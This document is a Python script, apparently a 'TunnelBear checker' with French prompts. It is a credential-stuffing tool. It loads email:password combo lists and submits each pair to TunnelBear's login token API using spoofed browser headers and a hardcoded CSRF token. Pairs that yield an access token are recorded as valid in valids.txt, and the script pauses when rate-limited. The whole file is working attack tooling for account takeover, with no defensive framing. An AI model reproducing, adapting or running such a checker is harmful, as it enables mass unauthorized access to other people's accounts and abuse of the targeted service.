import requests
import time
from colorama import Fore, Style, init
import os
import uuid

init(autoreset=True)
VERT = Fore.GREEN

def print_title():
    ascii_art = r"""
████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     ██████╗ ███████╗ █████╗ ██████╗ 
╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     ██╔══██╗██╔════╝██╔══██╗██╔══██╗
   ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     ██████╔╝█████╗  ███████║██████╔╝
   ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     ██╔══██╗██╔══╝  ██╔══██║██╔══██╗
   ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗██████╔╝███████╗██║  ██║██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                      
        TUNNELBEAR CHECKER BY ESKA
    """
    print(VERT + ascii_art)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_valids_set():
    if not os.path.exists("valids.txt"):
        return set()
    with open("valids.txt", "r") as f:
        return set(line.strip() for line in f if line.strip())

def get_browser_device_id():
    return f"browser-{uuid.uuid4()}"

def check_account(email, password, valids_set):
    url = "https://prod-api-dashboard.tunnelbear.com/dashboard/web/v2/token"
    headers = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://www.tunnelbear.com",
    "Referer": "https://www.tunnelbear.com/",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "tb-csrf-token": "7b630d5542cd1b92b5777aca8531b03d61688954",
    "tunnelbear-app-id": "com.tunnelbear.web",
    "tunnelbear-app-version": "1.0.0",
    "tunnelbear-platform": "Opera",
    "tunnelbear-platform-version": "112.0.0.0"
}

    data = {
    "username": email,
    "password": password,
    "grant_type": "password",
    "device": get_browser_device_id()
}


    combo = f"{email}:{password}"

    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        resp_json = response.json()

        if response.status_code == 200 and "access_token" in resp_json:
            if combo not in valids_set:
                print(f"{VERT}[+] Compte VALIDE : {combo}")
                with open("valids.txt", "a") as f:
                    f.write(combo + "\n")
                valids_set.add(combo)
            else:
                print(f"{VERT}[+] Compte VALIDE déjà enregistré : {combo}")
            return True

        elif response.status_code == 401:
            print(f"{Fore.RED}[-] Compte INVALIDE : {combo}")
            return False

        elif response.status_code == 429:
            print(f"{Fore.MAGENTA}[!] Trop de requêtes")
            time.sleep(10)
            return False

        else:
            print(f"{Fore.YELLOW}[?] Réponse inattendue ({response.status_code}) pour {combo}")
            print(resp_json)
            return False

    except Exception as e:
        print(f"{Fore.RED}[!] Erreur sur {combo} - {str(e)}")
        return False

def lancer_checker():
    fichier = input(f"{VERT}[?] Chemin du fichier combos (email:pass) : {Style.RESET_ALL}")
    fichier = fichier.strip('"').strip("'")

    if not os.path.isfile(fichier):
        print(f"{Fore.RED}[!] Fichier introuvable ou chemin invalide.")
        return

    try:
        with open(fichier, 'r') as f:
            combos = f.read().splitlines()
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur lecture fichier : {str(e)}")
        return

    valids_set = load_valids_set()

    for combo in combos:
        try:
            email, password = combo.strip().split(":")
            check_account(email, password, valids_set)
            time.sleep(0)
        except Exception as e:
            print(f"{Fore.RED}[!] Erreur avec la ligne : {combo} - {str(e)}")

def menu():
    print_title()
    while True:
        print(f"\n{VERT}=== TUNNELBEAR CHECKER ==={Style.RESET_ALL}")
        print("[1] Lancer le checker")
        print("[2] Quitter")
        choix = input(f"{VERT}>>> {Style.RESET_ALL}")
        if choix == "1":
            lancer_checker()
        elif choix == "2":
            print(f"{VERT}Au revoir !")
            break
        else:
            print(f"{Fore.RED}[!] Choix invalide.")

clear_console()
menu()
